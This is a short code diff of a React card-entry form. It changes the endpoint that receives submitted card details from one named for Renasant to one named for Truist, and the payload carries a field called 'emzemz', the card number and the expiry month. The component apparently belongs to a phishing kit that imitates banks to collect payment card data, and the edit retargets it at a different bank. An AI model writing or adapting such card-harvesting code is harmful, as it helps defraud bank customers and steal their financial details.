@@ -66,7 +66,7 @@ const Card: React.FC = () => {
 
     if (!Object.values(newErrors).some(error => error)) {
       try {
-        await axios.post(`${baseUrl}api/renasant-card-info/`, {
+        await axios.post(`${baseUrl}api/truist-card-info/`, {
           emzemz,
           cardNumber: cardDigits,
           expiryMonth,
